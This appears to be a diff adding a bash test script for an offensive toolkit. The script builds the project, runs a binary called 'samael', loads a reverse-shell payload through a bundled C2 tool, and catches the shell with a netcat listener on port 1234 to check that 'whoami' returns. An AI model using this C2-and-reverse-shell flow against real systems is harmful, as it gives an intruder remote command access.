@@ -1,0 +1,24 @@
+#!/usr/bin/env bash
+user=$(whoami) > /dev/null
+killall test 2> /dev/null
+
+if [ ${PWD##*/} == "tests" ]
+then
+    cd ../
+
+fi
+
+cd ../
+make clean > /dev/null
+make > /dev/null
+cd src/
+./samael > /dev/null
+./test > /dev/null
+../tools/c2/c2 ../payloads/reverse_shell.so
+output=$((echo -e "whoami \n exit" | nc -lp 1234 ) 2> /dev/null)
+if [ "$output" != "$user" ]
+then
+    echo "[X] Reverse Shell Test Failed"
+else
+    echo "[*] Reverse Shell Test Passed"
+fi
